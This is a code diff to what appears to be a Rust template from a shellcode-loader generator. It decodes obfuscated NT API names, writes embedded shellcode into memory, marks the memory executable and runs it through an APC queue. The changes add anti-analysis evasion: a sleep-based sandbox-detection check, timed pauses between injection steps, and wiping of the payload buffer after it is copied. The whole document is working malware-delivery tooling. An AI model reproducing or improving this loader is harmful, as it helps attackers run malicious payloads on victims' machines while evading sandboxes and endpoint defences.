@@ -16,6 +16,8 @@ use winapi::{
     ctypes::c_void,
 };
 
+use std::time::Instant;
+
 {{IMPORTS}}
 
 {{SANDBOX_IMPORTS}}
@@ -30,6 +32,7 @@ const OBF_C: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
 const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
 const OBF_F: &[u8] = &{{OBF_NT_QUEUE_APC_THREAD}};
 const OBF_G: &[u8] = &{{OBF_NT_TEST_ALERT}};
+const OBF_H: &[u8] = &{{OBF_NT_DELAY_EXECUTION}};
 
 fn r(d: &[u8]) -> Vec<u8> {
     d.iter().map(|b| b ^ K).collect()
@@ -47,6 +50,28 @@ type FC = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, usize, *mu
 type FD = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
 type FF = unsafe extern "system" fn(HANDLE, ApcRoutine, *mut c_void, *mut c_void, *mut c_void) -> i32;
 type FG = unsafe extern "system" fn() -> i32;
+type FH = unsafe extern "system" fn(u32, *const i64) -> i32;
+
+fn pause(ms: i64) {
+    unsafe {
+        let f: FH = std::mem::transmute(g(OBF_H));
+        let interval: i64 = -(ms * 10_000);
+        f(0, &interval);
+    }
+}
+
+fn check_environment() -> bool {
+    let start = Instant::now();
+    pause(3000);
+    start.elapsed().as_millis() >= 2500
+}
+
+fn wipe(buf: &mut Vec<u8>) {
+    for b in buf.iter_mut() {
+        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
+    }
+    buf.clear();
+}
 
 fn enhance(mut buf: Vec<u8>) {
     let current_process: HANDLE = -1isize as HANDLE;
@@ -63,17 +88,23 @@ fn enhance(mut buf: Vec<u8>) {
         let mut size: usize = buf.len();
         let s = f_alloc(current_process, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(s) { return; }
-        
-        let mut written = 0;
-        let ptr = buf.as_mut_ptr() as *mut c_void;
-        let len = buf.len();
-        let s = f_write(current_process, base, ptr, len, &mut written);
+
+        pause(150);
+
+        let buf_len = buf.len();
+        let mut written: usize = 0;
+        let s = f_write(current_process, base, buf.as_mut_ptr() as *mut c_void, buf_len, &mut written);
         if !NT_SUCCESS(s) { return; }
 
-        let mut old: u32 = PAGE_READWRITE;
-        let mut psize = len;
-        let s = f_protect(current_process, &mut base, &mut psize, PAGE_EXECUTE_READ, &mut old);
+        wipe(&mut buf);
+        pause(200);
+
+        let mut old_protect: u32 = 0;
+        let mut region_size = buf_len;
+        let s = f_protect(current_process, &mut base, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
         if !NT_SUCCESS(s) { return; }
+
+        pause(100);
 
         let apc_routine: ApcRoutine = Some(std::mem::transmute(base));
         let s = f_queue(current_thread, apc_routine, base, null_mut(), null_mut());
@@ -85,14 +116,15 @@ fn enhance(mut buf: Vec<u8>) {
 
 fn main() {
     {{SANDBOX}}
-    
+
+    if !check_environment() { return; }
+
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
-    let mut vec: Vec<u8> = Vec::new();
-    for i in buf.iter() {
-        vec.push(*i);
-    }
+    let mut vec: Vec<u8> = buf.to_vec();
+
     {{MAIN}}
-    enhance(vec.clone());
+
+    enhance(vec);
 }
 
 {{DLL_MAIN}}
